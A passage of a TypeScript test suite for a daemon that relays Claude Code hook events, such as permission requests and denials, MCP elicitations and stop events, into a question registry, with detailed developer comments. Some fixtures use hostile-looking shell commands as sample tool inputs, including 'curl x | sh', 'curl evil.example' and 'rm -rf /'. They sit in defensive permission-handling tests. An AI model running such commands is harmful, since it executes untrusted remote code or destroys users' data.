        session_id: 'claude-799-failure-nomatch',
        agent_id: 'agent-799-6',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf build/' },
      });

      hookServer.fire('PostToolUseFailure', {
        session_id: 'claude-799-failure-nomatch',
        agent_id: 'agent-799-6',
        agent_type: 'general-purpose',
        hook_event_name: 'PostToolUseFailure',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf dist/' }, // different command -> no signature match
        error: 'exit 1',
      });

      expect(broadcastResolvedLog).toHaveLength(0);
    });
  });

  // ---------------------------------------------------------------------------
  // #889 (Q4): a classifier-denied permission fires no tool call, so
  // PreToolUse/PostToolUse never observe it -- PermissionDenied is wired into
  // the SAME `cancelExternallyResolved` funnel. Matching is
  // tool_name+tool_input+agentId; `PermissionDenied` also carries a
  // `tool_use_id`, but it is forward-compatible only.
  //
  // Deliberately NO test for exact-`tool_use_id` disambiguation through this
  // path, and that absence is the honest outcome rather than a gap: the
  // registered signature is built from the `PermissionRequest` that opened the
  // escalation, and that event never sends a `tool_use_id`, so
  // `findOpenQuestionMatching`'s "both sides carry one" branch cannot be
  // reached from here. Writing such a test would mean fabricating a
  // `PermissionRequest` with an id Claude Code does not send -- a test that
  // passes about an input shape that never occurs, which is exactly the
  // coverage claim ADR 0014 says not to make. The branch itself IS covered,
  // generically, by `auto-approve-gate.test.ts`. Reconsider when a capture
  // shows `PermissionRequest` carrying an id.
  // ---------------------------------------------------------------------------
  describe('#889 (Q4): PermissionDenied external resolution', () => {
    function lock(id: string): void {
      // #930: SessionStart is no longer a registered/dispatched hook
      // event (Claude Code discards http-type hooks for it). Notification
      // with a neutral type locks the binder via the same onHookEvent()
      // first-adopt path with zero downstream side effects (handleNotification
      // no-ops for anything outside permission_prompt/idle_prompt/
      // elicitation_dialog).
      hookServer.fire('Notification', {
        session_id: id,
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        hook_event_name: 'Notification',
        notification_type: 'auth_success',
        message: '',
      });
    }

    test('a matching MAIN PermissionDenied resolves the open (parked/passthrough) escalation', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
      lock('claude-889-denied-main');

      const decision = hookServer.firePermission({
        session_id: 'claude-889-denied-main',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'curl evil.example' },
      });
      expect(broadcastResolvedLog).toHaveLength(0); // still open (held, #1126)

      hookServer.fire('PermissionDenied', {
        session_id: 'claude-889-denied-main',
        hook_event_name: 'PermissionDenied',
        tool_name: 'Bash',
        tool_input: { command: 'curl evil.example' },
        tool_use_id: 'tu-1',
        reason: 'blocked by classifier',
      });

      expect(broadcastResolvedLog).toHaveLength(1);
      expect(broadcastResolvedLog[0]?.reason).toBe('cancelled');
      // The hold ends with the empty response, which decides nothing.
      expect(await decision).toBe('passthrough');
    });

    test('a matching SUBAGENT PermissionDenied resolves the parked escalation, scoped to that agent', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      const { tracker } = build({
        broadcastResolvedLog,
      });
      lock('claude-889-denied-sub');

      await hookServer.firePermission({
        session_id: 'claude-889-denied-sub',
        agent_id: 'agent-889-1',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf /tmp/x' },
      });
      expect(tracker.awaitingPTYCountForTest()).toBe(1);

      hookServer.fire('PermissionDenied', {
        session_id: 'claude-889-denied-sub',
        agent_id: 'agent-889-1',
        hook_event_name: 'PermissionDenied',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf /tmp/x' },
        tool_use_id: 'tu-2',
      });

      // Never rendered, so never pushed: nothing to dismiss (#1125), but the
      // gate no longer tracks it either.
      expect(broadcastResolvedLog).toHaveLength(0);
      expect(bridgeHandles.at(-1)?.gate.forceRelease('probe')).toEqual({ resolved: 0 });
    });

    test('with two escalations open on the SAME signature, PermissionDenied resolves only its own agent', async () => {
      // Review gap: dropping the `sig.agentId !== observed.agentId` check in
      // `findOpenQuestionMatching` left all 160 tests in the two files this PR
      // touches green. The shared matcher is covered in
      // `auto-approve-gate.test.ts`, but nothing proved the `agentId:
      // input.agent_id` passthrough on THIS wiring path actually scopes -- and
      // a PermissionDenied closing another agent's still-open question is the
      // swallow class #925 was. Same tool + same tool_input on purpose, so
      // agent identity is the ONLY thing that can disambiguate.
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
      lock('claude-889-denied-2agents');

      void hookServer.firePermission({
        session_id: 'claude-889-denied-2agents',
        agent_id: 'agent-A',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'git push' },
      });
      void hookServer.firePermission({
        session_id: 'claude-889-denied-2agents',
        agent_id: 'agent-B',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'git push' },
      });
      expect(broadcastResolvedLog).toHaveLength(0);

      hookServer.fire('PermissionDenied', {
        session_id: 'claude-889-denied-2agents',
        agent_id: 'agent-A',
        hook_event_name: 'PermissionDenied',
        tool_name: 'Bash',
        tool_input: { command: 'git push' },
      });

      // Exactly one resolution: agent-B's question must survive, because it is
      // still open and only the PTY can answer it.
      expect(broadcastResolvedLog).toHaveLength(1);

      // And agent-B's own denial still resolves it afterward -- proving the
      // survivor was genuinely still tracked, not silently dropped.
      hookServer.fire('PermissionDenied', {
        session_id: 'claude-889-denied-2agents',
        agent_id: 'agent-B',
        hook_event_name: 'PermissionDenied',
        tool_name: 'Bash',
        tool_input: { command: 'git push' },
      });
      expect(broadcastResolvedLog).toHaveLength(2);
    });

    test('a non-matching PermissionDenied (different tool_input) leaves the open escalation untouched', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      const { handle } = build({
        broadcastResolvedLog,
        realMessageApi: true,
        hasLocalTerminal: false,
      });
      lock('claude-889-denied-nomatch');

      const decision = hookServer.firePermission({
        session_id: 'claude-889-denied-nomatch',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      });

      hookServer.fire('PermissionDenied', {
        session_id: 'claude-889-denied-nomatch',
        hook_event_name: 'PermissionDenied',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf /' }, // different command -> no signature match
      });

      expect(broadcastResolvedLog).toHaveLength(0);
      handle.gate.forceRelease('test');
      expect(await decision).toBe('passthrough');
    });

    test('PermissionDenied for a FOREIGN session_id is dropped by the admit gate (no cross-session resolution)', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      const { handle } = build({
        broadcastResolvedLog,
        realMessageApi: true,
        hasLocalTerminal: false,
      });
      lock('claude-889-denied-foreign');

      const decision = hookServer.firePermission({
        session_id: 'claude-889-denied-foreign',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      });

      hookServer.fire('PermissionDenied', {
        session_id: 'claude-OTHER',
        hook_event_name: 'PermissionDenied',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      });

      expect(broadcastResolvedLog).toHaveLength(0);
      handle.gate.forceRelease('test');
      expect(await decision).toBe('passthrough');
    });

    test('#1126: an admitted PermissionDenied reaches the harness_denied push, never a card', () => {
      const denied: unknown[] = [];
      const { handle } = build({ realMessageApi: true, onHarnessDenied: (i) => denied.push(i) });
      lock('claude-1126-denied');
      const event = {
        session_id: 'claude-1126-denied',
        hook_event_name: 'PermissionDenied',
        tool_name: 'Bash',
        tool_input: { command: 'curl x | sh' },
        tool_use_id: 'tu-d',
        reason: 'remote script',
      };
      hookServer.fire('PermissionDenied', event);
      expect(denied).toEqual([event]);
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);
      expect(handle.gate.forceRelease('probe')).toEqual({ resolved: 0 });

      // A sibling session's denial is not ours to report.
      hookServer.fire('PermissionDenied', { ...event, session_id: 'claude-OTHER' });
      expect(denied).toHaveLength(1);
    });

    test('with NO open escalation at all, PermissionDenied is a clean no-op (never throws)', () => {
      build();
      lock('claude-889-denied-empty');

      expect(() =>
        hookServer.fire('PermissionDenied', {
          session_id: 'claude-889-denied-empty',
          hook_event_name: 'PermissionDenied',
          tool_name: 'Bash',
          tool_input: { command: 'echo hi' },
        }),
      ).not.toThrow();
    });
  });

  // ---------------------------------------------------------------------------
  // #889 (Q4): an MCP Elicitation dialog previously arrived only as a PTY
  // orphan. These tests construct the REAL MessageAPI (ADR 0014: the push
  // path is directly involved -- the claim under test is "the card actually
  // reached the registry via the real dedup", not just "a stub was called").
  // ---------------------------------------------------------------------------
  describe('#889 (Q4): Elicitation / ElicitationResult (real MessageAPI, ADR 0014)', () => {
    function lock(id: string): void {
      // #930: SessionStart is no longer a registered/dispatched hook
      // event (Claude Code discards http-type hooks for it). Notification
      // with a neutral type locks the binder via the same onHookEvent()
      // first-adopt path with zero downstream side effects (handleNotification
      // no-ops for anything outside permission_prompt/idle_prompt/
      // elicitation_dialog).
      hookServer.fire('Notification', {
        session_id: id,
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        hook_event_name: 'Notification',
        notification_type: 'auth_success',
        message: '',
      });
    }

    test('Elicitation builds a free-text card that reaches sessionRegistry through the real dedup', () => {
      build({ realMessageApi: true });
      lock('claude-889-elicit-1');

      hookServer.fire('Elicitation', {
        session_id: 'claude-889-elicit-1',
        hook_event_name: 'Elicitation',
        mcp_server_name: 'weather-mcp',
        message: 'Which city?',
        elicitation_id: 'elicit-abc',
      });

      const questions = [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])];
      expect(questions).toHaveLength(1);
      expect(questions[0]?.text).toBe('weather-mcp: Which city?');
      expect(questions[0]?.source).toBe('elicitation');
      expect(questions[0]?.allowsFreeText).toBe(true);
      expect(questions[0]?.options).toEqual([]);
    });

    test('ElicitationResult resolves the exact card by elicitation_id', () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ realMessageApi: true, broadcastResolvedLog });
      lock('claude-889-elicit-2');

      hookServer.fire('Elicitation', {
        session_id: 'claude-889-elicit-2',
        hook_event_name: 'Elicitation',
        mcp_server_name: 'weather-mcp',
        message: 'Which city?',
        elicitation_id: 'elicit-xyz',
      });
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1);

      hookServer.fire('ElicitationResult', {
        session_id: 'claude-889-elicit-2',
        hook_event_name: 'ElicitationResult',
        mcp_server_name: 'weather-mcp',
        elicitation_id: 'elicit-xyz',
        action: 'accept',
      });

      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(0);
      expect(broadcastResolvedLog).toHaveLength(1);
      expect(broadcastResolvedLog[0]?.reason).toBe('cancelled');
    });

    test('a re-fired Elicitation for the same id keeps the live card resolvable (review finding)', () => {
      // The dedup drops the second emission (same text, same 0 options, same
      // allowsFreeText -> never "richer", and status never left 'waiting' to
      // reset the baseline), so its returned id names a card that was never
      // registered. Blindly overwriting the correlation pointed
      // ElicitationResult at that phantom and orphaned card A -- the card the
      // user is actually looking at -- with no automated way to clear it.
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ realMessageApi: true, broadcastResolvedLog });
      lock('claude-889-elicit-dup');

      const fire = (): void => {
        hookServer.fire('Elicitation', {
          session_id: 'claude-889-elicit-dup',
          hook_event_name: 'Elicitation',
          mcp_server_name: 'weather-mcp',
          message: 'Which city?',
          elicitation_id: 'elicit-dup',
        });
      };
      fire();
      const cardA = [...(sessionRegistry.getSession(SID)?.currentQuestions.keys() ?? [])][0];
      expect(cardA).toBeDefined();

      fire();
      // The repeat never became a second card, so there is still exactly one.
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1);

      hookServer.fire('ElicitationResult', {
        session_id: 'claude-889-elicit-dup',
        hook_event_name: 'ElicitationResult',
        mcp_server_name: 'weather-mcp',
        elicitation_id: 'elicit-dup',
        action: 'accept',
      });

      // The still-live card A is the one that resolves, not a phantom.
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(0);
      expect(broadcastResolvedLog).toHaveLength(1);
      expect(broadcastResolvedLog[0]?.questionId).toBe(cardA as UUID);
    });

    test('a re-fired Elicitation with a CHANGED message (genuinely richer, not deduped) still keeps the OLDER live card resolvable', () => {
      // Isolates the "still live" guard (:479, `previousIsLive`) from the
      // "was not registered" guard (:496) above -- mutation testing this
      // suite found the test above passes even with `previousIsLive`
      // neutered, because a byte-identical re-fire is ALSO caught by the
      // "was not registered" guard alone (QuestionDedup suppresses an
      // unchanged re-emission regardless). That means the test above never
      // actually exercised this guard's own reason to exist. A DIFFERENT
      // message for the same elicitation_id has a DIFFERENT dedup
      // fingerprint, so QuestionDedup lets it through (registers, does not
      // dedupe) -- the only way to isolate `previousIsLive` from the dedup
      // guard it sits beside.
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ realMessageApi: true, broadcastResolvedLog });
      lock('claude-889-elicit-changed');

      hookServer.fire('Elicitation', {
        session_id: 'claude-889-elicit-changed',
        hook_event_name: 'Elicitation',
        mcp_server_name: 'weather-mcp',
        message: 'Which city?',
        elicitation_id: 'elicit-changed',
      });
      const cardA = [...(sessionRegistry.getSession(SID)?.currentQuestions.keys() ?? [])][0];
      expect(cardA).toBeDefined();

      // Different message -> different fingerprint -> QuestionDedup does NOT
      // suppress this one; it registers as its own, genuinely separate card.
      hookServer.fire('Elicitation', {
        session_id: 'claude-889-elicit-changed',
        hook_event_name: 'Elicitation',
        mcp_server_name: 'weather-mcp',
        message: 'Which city, and for what date?',
        elicitation_id: 'elicit-changed',
      });
      // Both cards are real, live questions in the registry -- rememberElicitation
      // only controls the elicitation_id CORRELATION, not whether MessageAPI
      // registered the second card.
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(2);

      hookServer.fire('ElicitationResult', {
        session_id: 'claude-889-elicit-changed',
        hook_event_name: 'ElicitationResult',
        mcp_server_name: 'weather-mcp',
        elicitation_id: 'elicit-changed',
        action: 'accept',
      });

      // The guard kept tracking card A (still live when the second fired),
      // so THIS is the one that resolves -- card B (registered but never
      // adopted into the correlation map) stays.
      expect(broadcastResolvedLog).toHaveLength(1);
      expect(broadcastResolvedLog[0]?.questionId).toBe(cardA as UUID);
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1);
      expect(sessionRegistry.getQuestion(SID, cardA as UUID)).toBeNull();
    });

    test('ElicitationResult with an UNKNOWN elicitation_id is a no-op (card, if any, stays)', () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ realMessageApi: true, broadcastResolvedLog });
      lock('claude-889-elicit-3');

      hookServer.fire('Elicitation', {
        session_id: 'claude-889-elicit-3',
        hook_event_name: 'Elicitation',
        mcp_server_name: 'weather-mcp',
        message: 'Which city?',
        elicitation_id: 'elicit-real',
      });

      hookServer.fire('ElicitationResult', {
        session_id: 'claude-889-elicit-3',
        hook_event_name: 'ElicitationResult',
        mcp_server_name: 'weather-mcp',
        elicitation_id: 'elicit-DOES-NOT-EXIST',
      });

      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1); // untouched
      expect(broadcastResolvedLog).toHaveLength(0);
    });

    test('an Elicitation with NO elicitation_id still creates a card, but is not resolvable by ElicitationResult', () => {
      build({ realMessageApi: true });
      lock('claude-889-elicit-4');

      hookServer.fire('Elicitation', {
        session_id: 'claude-889-elicit-4',
        hook_event_name: 'Elicitation',
        mcp_server_name: 'weather-mcp',
        message: 'Which city?',
        // no elicitation_id
      });

      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1);

      // A later ElicitationResult (even with a real id from some OTHER
      // dialog) cannot possibly correlate -- graceful degradation, same as
      // PermissionRequest's own missing tool_use_id.
      hookServer.fire('ElicitationResult', {
        session_id: 'claude-889-elicit-4',
        hook_event_name: 'ElicitationResult',
        mcp_server_name: 'weather-mcp',
        elicitation_id: 'some-other-id',
      });
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1); // still there
    });

    test('a NEW elicitation_id whose own card is deduped is never tracked (#888 criterion iii, "was not registered" guard)', () => {
      // Distinct from the re-fired-same-id test above: that one exercises
      // rememberElicitation's OTHER guard (a PREVIOUSLY tracked, still-live
      // card must not be displaced -- necessarily a store re-query, since it
      // asks about history). This test isolates the guard #888 criterion iii
      // actually changed: a FIRST-time elicitation_id whose OWN push never
      // registered (deduped against an unrelated still-live baseline) must
      // not be tracked either -- decided directly from handleElicitation's
      // returned QuestionRegistrationOutcome, not a SessionRegistry re-query.
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ realMessageApi: true, broadcastResolvedLog });
      lock('claude-889-elicit-notreg');

      hookServer.fire('Elicitation', {
        session_id: 'claude-889-elicit-notreg',
        hook_event_name: 'Elicitation',
        mcp_server_name: 'weather-mcp',
        message: 'Which city?',
        elicitation_id: 'elicit-first',
      });
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1);

      // Same mcp_server_name/message -> identical text/options/allowsFreeText
      // fingerprint, same agent ('main'), still inside QuestionDedup's
      // window: this second card is DEDUPED (QuestionDedup makes no
      // exception for a different elicitation_id -- it only sees the
      // Question). handleElicitation still mints and returns a fresh
      // questionId regardless; that id must never reach elicitationQuestions.
      hookServer.fire('Elicitation', {
        session_id: 'claude-889-elicit-notreg',
        hook_event_name: 'Elicitation',
        mcp_server_name: 'weather-mcp',
        message: 'Which city?',
        elicitation_id: 'elicit-second',
      });
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1); // no second card

      // The deciding assertion: resolving the NEVER-REGISTERED id must be a
      // no-op -- no broadcast for a card no client ever saw. Neutering the
      // guard (`if (outcome?.status !== 'registered')`) makes this fire a
      // phantom broadcast while every assertion above still passes.
      hookServer.fire('ElicitationResult', {
        session_id: 'claude-889-elicit-notreg',
        hook_event_name: 'ElicitationResult',
        mcp_server_name: 'weather-mcp',
        elicitation_id: 'elicit-second',
        action: 'accept',
      });
      expect(broadcastResolvedLog).toHaveLength(0);
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(1); // still there

      // The FIRST id, which DID register, remains resolvable -- proving the
      // guard is scoped correctly and not just refusing everything.
      hookServer.fire('ElicitationResult', {
        session_id: 'claude-889-elicit-notreg',
        hook_event_name: 'ElicitationResult',
        mcp_server_name: 'weather-mcp',
        elicitation_id: 'elicit-first',
        action: 'accept',
      });
      expect(broadcastResolvedLog).toHaveLength(1);
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(0);
    });

    test('Elicitation for a FOREIGN session_id is dropped by the admit gate', () => {
      build({ realMessageApi: true });
      lock('claude-889-elicit-5');

      hookServer.fire('Elicitation', {
        session_id: 'claude-OTHER',
        hook_event_name: 'Elicitation',
        mcp_server_name: 'weather-mcp',
        message: 'Which city?',
        elicitation_id: 'elicit-foreign',
      });

      expect(sessionRegistry.getSession(SID)?.currentQuestions.size).toBe(0);
    });
  });

  describe('child-liveness + port-ownership rotation (#451)', () => {
    /** Write a transcript whose head optionally carries the remi:<port> marker. */
    function writeTranscript(claudeId: string, ownerPort: number | null): string {
      const p = path.join(tmpDir, `${claudeId}.jsonl`);
      const head =
        ownerPort !== null
          ? `${JSON.stringify({ type: 'custom-title', customTitle: `remi:${ownerPort}` })}\n`
          : '';
      fs.writeFileSync(
        p,
        `${head}${JSON.stringify({
          type: 'user',
          uuid: 'u1',
          sessionId: claudeId,
          message: { role: 'user', content: 'hi' },
        })}\n`,
      );
      return p;
    }

    /** Pre-seed the store binding so the first event adopts the lock. */
    function seedLock(claudeId: string): void {
      sessionStore.save({
        remiSessionId: SID,
        claudeSessionId: claudeId,
        projectPath: tmpDir,
        port: 8765, // matches the harness currentPort()
        pid: process.pid,
        startedAt: new Date().toISOString(),
        exitedAt: null,
        exitCode: null,
      });
    }

    function stopWatchers(): void {
      for (const w of transcriptWatchers.values()) {
        try {
          w.stop();
        } catch {
          /* best effort */
        }
      }
    }

    const CLAUDE_A = 'aaaaaaaa-1111-1111-1111-111111111111';

    // #930: the sibling/zombie/port-marker ROTATION scenarios that used to
    // live in this describe block (fired two SessionStarts to simulate a
    // live-PTY restart) relied on the SessionStart hookServer listener
    // calling `binder.preemptOnSessionStart` before `binder.onHookEvent` --
    // the ONLY way this integration layer could flip `mainSessionEnded` on a
    // live PTY without an intervening SessionEnd. That listener is deleted
    // (Claude Code hard-discards http-type hooks for SessionStart, so it
    // never fired in production either -- see hook-types.ts's
    // REMI_REGISTERED_HOOK_EVENTS doc comment).
    //
    // Deleted rather than "covered elsewhere": the scenarios these tests
    // exercised hinged on `preemptOnSessionStart`'s sibling/ownership guard
    // (`!this.hasSiblingInDir() || this.ownsTranscript(event.transcript_path)`,
    // `transcript-binder.ts:480`) taking its `!hasSiblingInDir()` branch --
    // i.e. a rotation event arriving with an UNMARKED or foreign-port
    // transcript (`ownsTranscript()` false) while a sibling is present. That
    // branch is now unreachable through `preemptOnSessionStart`'s only
    // production caller: `feedSyntheticRotation`'s candidate loop
    // (`transcript-binder.ts:~1117`) already drops any candidate whose
    // `ownerPort !== currentPort()` BEFORE it ever calls
    // `preemptOnSessionStart`, so `ownsTranscript()` is guaranteed true by
    // the time it runs -- the `!hasSiblingInDir()` side of the OR never
    // gets to matter. The deleted tests were not testing dead-but-parallel
    // coverage; they were testing a guard configuration that can no longer
    // occur.
    //
    // This is NOT a matched set against `transcript-binder.test.ts`: that
    // file has exactly ONE `#451`-labeled test (`#451: restart with a live
    // sibling + unmarked transcript defers`, line 496) and ONE zombie test
    // (`a zombie sibling (claude child exited) does not by itself block
    // reclaim, but staleness does`, line 1702) -- and the zombie test's
    // single `admitted === false` assertion cannot on its own distinguish
    // "zombie correctly ignored, staleness alone blocks" from "zombie
    // incorrectly blocks" (its setup combines a zombie sibling AND a stale
    // transcript, per its own title). Cited as the one surviving analog, not
    // as a parallel set proving the deleted scenarios stayed covered.
    //
    // Only the ONE test below survives here: it locks via the store-adoption
    // path (`seedLock` + a single PreToolUse), which never depended on
    // SessionStart at all.
    test('self-heals the watcher when locked-from-store but the fallback gave up', () => {
      // The osa case: single daemon, no sibling. The lock is adopted from the
      // store (deterministic pre-spawn binding), but no watcher exists because
      // the 30s fallback poll timed out before Claude wrote its first transcript
      // line. The next hook event from our own Claude must start the watcher
      // (no port marker needed: the session_id match is proof of ownership).
      seedLock(CLAUDE_A);
      writeTranscript(CLAUDE_A, null);

      build();
      // No fallback ran in this harness, so we start with no watcher.
      expect(transcriptWatchers.has(SID)).toBe(false);

      hookServer.fire('PreToolUse', {
        session_id: CLAUDE_A,
        transcript_path: path.join(tmpDir, `${CLAUDE_A}.jsonl`),
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
        hook_event_name: 'PreToolUse',
      });

      try {
        expect(transcriptWatchers.get(SID)?.filePath).toBe(path.join(tmpDir, `${CLAUDE_A}.jsonl`));
      } finally {
        stopWatchers();
      }
    });
  });

  // Epic #453 phase 0: pin TODAY's behavior so the QuestionPipeline / binder
  // refactor is verified against a baseline. These tests change no production
  // code; they characterize. The migration-safety + Codex critics flagged
  // that the existing realTracker tests assert hasPendingForTest() but never
  // that the push itself is gated on PTY presence, so a refactor could
  // collapse the two-step recordPendingHook -> onPTYPromptVisible contract
  // into a direct handleQuestion and still pass.
  describe('phase 0 characterization (#453 baseline)', () => {
    test('two-step push: a hook stashes pending WITHOUT pushing; only PTY presence fires the push', () => {
      const { tracker } = build({ realTracker: true });

      hookServer.fire('Notification', {
        session_id: 'claude-twostep',
        hook_event_name: 'Notification',
        transcript_path: path.join(tmpDir, 'twostep.jsonl'),
        notification_type: 'auth_success',
        message: '',
      });

      // A parked subagent prompt: the two-step contract it still follows (a
      // main-agent binary prompt is held and pushed at hook time, #1126).
      hookServer.fire('PermissionRequest', {
        session_id: 'claude-twostep',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
        agent_id: 'agent-twostep',
        agent_type: 'general-purpose',
      });

      // The hook recorded a pending question but did NOT push (no handleQuestion).
      expect(tracker.hasPendingForTest()).toBe(true);
      expect(messageApiLog.questionCalls).toBe(0);

      // The PTY confirms the prompt is on screen -> the push fires exactly once.
      tracker.onPTYPromptVisible({
        id: 'pty-twostep',
        text: 'Allow Bash?',
        options: [],
        allowsFreeText: false,
        isAnswered: false,
      } as unknown as Question);

      expect(messageApiLog.questionCalls).toBe(1);
    });
  });

  describe('#891: free-win hook field consumption', () => {
    /** Fire a neutral Notification so the bridge locks onto `id` (admit gate then passes; #930). */
    function lock(id: string): void {
      // #930: SessionStart is no longer a registered/dispatched hook
      // event (Claude Code discards http-type hooks for it). Notification
      // with a neutral type locks the binder via the same onHookEvent()
      // first-adopt path with zero downstream side effects (handleNotification
      // no-ops for anything outside permission_prompt/idle_prompt/
      // elicitation_dialog).
      hookServer.fire('Notification', {
        session_id: id,
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        hook_event_name: 'Notification',
        notification_type: 'auth_success',
        message: '',
      });
    }

    test('SubagentStop threads agent_transcript_path through to the SubagentViewRegistry', () => {
      const subagentViews = new SubagentViewRegistry();
      build({ subagentViews });
      lock('claude-891-a');
      const mainTranscriptPath = path.join(tmpDir, 'claude-891-a.jsonl');
      hookServer.fire('SubagentStart', {
        session_id: 'claude-891-a',
        agent_id: 'sub-1',
        agent_type: 'code-architect',
        transcript_path: mainTranscriptPath,
      });
      // The derived path (from SubagentStart) is the pre-#891 baseline.
      const derived = subagentViews.resolvePath('sub-1');
      expect(derived).not.toBeNull();

      // SubagentStop now hands over the real path directly; it wins over the
      // START-time derivation even when the two differ (a real Claude Code
      // session never disagrees -- see subagent-view-registry.ts's #891 doc
      // comment for the verified-against-captures claim -- but the plumbing
      // must prefer the carried value regardless).
      const carried = path.join(tmpDir, 'claude-891-a', 'subagents', 'agent-sub-1-carried.jsonl');
      hookServer.fire('SubagentStop', {
        session_id: 'claude-891-a',
        agent_id: 'sub-1',
        agent_transcript_path: carried,
      });
      expect(subagentViews.resolvePath('sub-1')).toBe(carried);
      expect(subagentViews.resolvePath('sub-1')).not.toBe(derived);
      expect(subagentViews.list()[0]?.active).toBe(false);
    });

    test('SubagentStop with no agent_transcript_path keeps the derived path (fallback)', () => {
      const subagentViews = new SubagentViewRegistry();
      build({ subagentViews });
      lock('claude-891-b');
      const mainTranscriptPath = path.join(tmpDir, 'claude-891-b.jsonl');
      hookServer.fire('SubagentStart', {
        session_id: 'claude-891-b',
        agent_id: 'sub-1',
        agent_type: 'Explore',
        transcript_path: mainTranscriptPath,
      });
      const derived = subagentViews.resolvePath('sub-1');
      hookServer.fire('SubagentStop', {
        session_id: 'claude-891-b',
        agent_id: 'sub-1',
        // No agent_transcript_path (older Claude Code, or the field genuinely absent).
      });
      expect(subagentViews.resolvePath('sub-1')).toBe(derived);
    });

    test('Stop logs the truncated last_assistant_message (turn genuinely complete)', () => {
      const logs: string[] = [];
      configureLogger({ writeLog: (msg) => logs.push(msg) });
      build();
      lock('claude-891-stop');
      const longMessage = `Line one.\n\nLine two with lots of detail. ${'x'.repeat(300)}`;
      hookServer.fire('Stop', {
        session_id: 'claude-891-stop',
        hook_event_name: 'Stop',
        stop_hook_active: false,
        last_assistant_message: longMessage,
      });
      const turnCompleteLines = logs.filter((l) => l.includes('Turn complete'));
      expect(turnCompleteLines.length).toBe(1);
      // The log line is keyed by remi's daemon-side session id (SID), not the
      // raw Claude session_id from the hook payload -- same convention every
      // other [Hooks] log line in this file uses.
      expect(turnCompleteLines[0]).toContain(SID);
      // Truncated: the 300+ char filler must not appear in full, and whitespace
      // (including the embedded newlines) is collapsed to single spaces.
      expect(turnCompleteLines[0]?.includes('x'.repeat(300))).toBe(false);
      expect(turnCompleteLines[0]).not.toContain('\n');
      expect(turnCompleteLines[0]).toContain('Line one. Line two with lots of detail.');
    });

    test('Stop does NOT log when stop_hook_active is true (turn is not actually done)', () => {
      const logs: string[] = [];
      configureLogger({ writeLog: (msg) => logs.push(msg) });
      build();
      lock('claude-891-stop-active');
      hookServer.fire('Stop', {
        session_id: 'claude-891-stop-active',
        hook_event_name: 'Stop',
        stop_hook_active: true,
        last_assistant_message: 'should not be logged',
      });
      expect(logs.some((l) => l.includes('Turn complete'))).toBe(false);
    });

    test('Stop does NOT log when last_assistant_message is absent', () => {
      const logs: string[] = [];
      configureLogger({ writeLog: (msg) => logs.push(msg) });
      build();
      lock('claude-891-stop-nomsg');
      hookServer.fire('Stop', {
        session_id: 'claude-891-stop-nomsg',
        hook_event_name: 'Stop',
        stop_hook_active: false,
      });
      expect(logs.some((l) => l.includes('Turn complete'))).toBe(false);
    });

    test('PostToolUse logs a slow tool call (duration_ms at/above threshold)', () => {
      const logs: string[] = [];
      configureLogger({ writeLog: (msg) => logs.push(msg) });
      build();
      lock('claude-891-slow');
      hookServer.fire('PostToolUse', {
        session_id: 'claude-891-slow',
        hook_event_name: 'PostToolUse',
        tool_name: 'Bash',
        tool_input: { command: 'sleep 10' },
        tool_response: {},
        duration_ms: 5_000,
      });
      const slowLines = logs.filter((l) => l.includes('Slow tool'));
      expect(slowLines.length).toBe(1);
      expect(slowLines[0]).toContain('Bash');
      expect(slowLines[0]).toContain('5000ms');
      expect(slowLines[0]).toContain(SID);
    });

    test('PostToolUse does NOT log a fast tool call (duration_ms below threshold)', () => {
      const logs: string[] = [];
